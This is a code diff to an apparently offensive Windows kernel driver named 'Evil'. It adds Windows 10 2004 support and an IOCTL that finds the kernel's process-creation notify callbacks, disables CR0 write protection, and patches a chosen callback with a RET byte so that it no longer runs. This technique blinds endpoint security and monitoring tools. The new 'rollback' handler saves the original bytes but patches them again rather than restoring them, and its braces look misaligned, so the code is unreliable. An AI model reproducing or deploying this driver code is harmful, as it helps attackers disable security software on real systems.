@@ -12,6 +12,7 @@ NTSTATUS EvilDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
 NTSTATUS EvilRead(_In_ PDEVICE_OBJECT, _In_ PIRP Irp);
 
 KIRQL g_irql;
+UCHAR g_StoreAddress[0x320]; // 8 byte array * 64 callbacks
 
 void CR0_WP_OFF_x64()
 {
@@ -88,6 +89,9 @@ WINDOWS_INDEX getWindowsIndex()
 		break;
 	case 18363:
 		return WindowsIndexWIN10_1909;
+		break;
+	case 19041:
+		return WindowsIndexWIN10_2004;
 		break;
 	default:
 		return WindowsIndexUNSUPPORTED;
@@ -327,6 +331,7 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 						}
 
 						PULONG64 pPointer = (PULONG64)NotifyAddr;
+						memcpy((g_StoreAddress + i * 8), pPointer, 8);
 						*pPointer = (ULONG64)0xc3;
 
 						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
@@ -341,6 +346,60 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			}
 			break;
 		}
+		case IOCTL_EVIL_ROLLBACK_RET:
+		{
+			ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
+
+			if (!PspCreateProcessNotifyRoutine)
+				return STATUS_SUCCESS;
+
+			int i = 0;
+			ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+			auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+			if (data == nullptr)
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+
+			for (i = 0; i < 64; i++)
+			{
+				MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
+				NotifyAddr = *(PULONG64)(MagicPtr);
+				if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+				{
+					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+
+					if (data->index == i)
+					{
+						int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);
+
+						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+						{
+							KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+							CR0_WP_OFF_x64();
+							KeRevertToUserAffinityThreadEx(oldAffinity);
+						}
+
+						PULONG64 pPointer = (PULONG64)NotifyAddr;
+						memcpy((g_StoreAddress + i * 8), pPointer, 8);
+						*pPointer = (ULONG64)0xc3;
+
+						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+						{
+							KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+							CR0_WP_ON_x64();
+							KeRevertToUserAffinityThreadEx(oldAffinity);
+						}
+						break;
+					}
+				}
+			}
+			break;
+	}
+
 		case IOCTL_EVIL_ZEROOUT_ARRAY:
 		{
 			ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
